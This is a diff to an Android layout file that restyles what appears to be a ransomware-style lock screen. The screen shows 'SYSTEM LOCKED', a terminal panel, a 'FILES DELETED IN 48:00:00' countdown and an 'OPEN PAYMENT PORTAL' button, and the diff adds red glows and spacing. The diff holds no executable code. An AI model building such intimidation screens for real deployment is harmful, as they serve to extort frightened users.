@@ -51,6 +51,11 @@
             android:layout_height="wrap_content"
             android:layout_marginTop="8dp"
             android:gravity="center"
+            android:letterSpacing="0.08"
+            android:shadowColor="#ff0000"
+            android:shadowDx="0"
+            android:shadowDy="0"
+            android:shadowRadius="18"
             android:text="SYSTEM LOCKED"
             android:textColor="#ff2222"
             android:textSize="30sp"
@@ -62,8 +67,9 @@
             android:layout_height="0dp"
             android:layout_marginTop="14dp"
             android:layout_weight="1"
-            android:background="#66000000"
-            android:fillViewport="true">
+            android:background="@drawable/bg_terminal"
+            android:fillViewport="true"
+            android:padding="10dp">
 
             <TextView
                 android:id="@+id/terminalText"
@@ -81,7 +87,8 @@
             android:layout_height="wrap_content"
             android:layout_marginTop="16dp"
             android:max="100"
-            android:progress="0"/>
+            android:progress="0"
+            android:progressTint="#ff2222"/>
 
         <TextView
             android:id="@+id/countdownText"
@@ -89,6 +96,11 @@
             android:layout_height="wrap_content"
             android:layout_gravity="center_horizontal"
             android:layout_marginTop="18dp"
+            android:letterSpacing="0.05"
+            android:shadowColor="#ff0000"
+            android:shadowDx="0"
+            android:shadowDy="0"
+            android:shadowRadius="12"
             android:text="FILES DELETED IN 48:00:00"
             android:textColor="#ffcc00"
             android:textSize="24sp"
@@ -110,6 +122,9 @@
             android:layout_gravity="center_horizontal"
             android:layout_marginTop="12dp"
             android:backgroundTint="#aa0000"
+            android:letterSpacing="0.06"
+            android:paddingStart="28dp"
+            android:paddingEnd="28dp"
             android:text="OPEN PAYMENT PORTAL"
             android:textColor="#ffffff"
             android:textStyle="bold"/>
